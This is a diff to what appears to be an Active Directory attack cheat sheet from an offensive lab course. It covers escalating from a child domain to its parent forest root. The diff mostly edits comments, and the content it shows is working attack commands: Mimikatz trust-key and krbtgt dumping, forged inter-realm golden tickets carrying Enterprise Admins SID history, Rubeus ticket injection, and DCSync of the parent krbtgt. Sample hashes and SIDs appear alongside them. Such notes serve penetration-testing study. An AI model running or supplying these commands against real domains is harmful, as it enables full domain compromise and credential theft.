@@ -266,31 +266,32 @@ C:> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc-host>
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<parent-dc>$
 C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
-Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)   <-- Need This
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)   <-- Need This for sid
 
-Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)           <-- Need This
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)           <-- Need This for SIDS
  [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    [[BLAH BLAH]]
         * aes256_hmac       7db7b5f208df1b004304bc02df21dc145147b5f093a97aef79170dd1befdaf30
         * aes128_hmac       d979ad3c525592356d62b641907e46cd
-        * rc4_hmac_nt       c4451dea556c1cdf20bd737ce7416d63                       <-- Need This
+        * rc4_hmac_nt       c4451dea556c1cdf20bd737ce7416d63                       <-- Need This for rc4
 
-# Create Inter Realm TGT on attacker machine. '/sids' is the sidhistory
-C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain_fqdn> /sid:<domain_sid> 
+# On attacket machine, with elevated shell, Create Inter Realm TGT on attacker machine. '/sids' is the sidhistory
+C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child_domain_fqdn> /sid:<domain_sid> 
                               /sids:<parent_domain_sid>-519 /rc4:<rc4_hmac_nt> /service:krbtgt 
                               /target:<target_domain_fqdn> /ticket:C:\trust_tkt.kirbi"'
 
 # Create a TGS using the created ticket
 C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:<target_domain_dc> /ptt
+# Here we get access to CIFS only
 ```
 #### Child to Parent Using krbtgt Hash
 ```powershell
 # With the krbtgt hash for child domain, create a inter realm TGT and inject in the process
-C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child_Domain> /sid:<child_Domain_sid> 
+C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child_domain> /sid:<child_Domain_sid> 
                                /sids:<target_domain_sid>-519 /krbtgt:<child_domain_krbtgt_hash> /ptt" "exit"'
 
 # Extract secrets from parent domain
-C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parent_Domain>\krbtgt /domain:<parent_Domain_fqdn>" "exit"'
+C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parent_domain>\krbtgt /domain:<parent_Domain_fqdn>" "exit"'
 ```
 #### Across Forest Using Trust Tickets
 - Only access to explicit resources. In this case to shared folder using CIFS
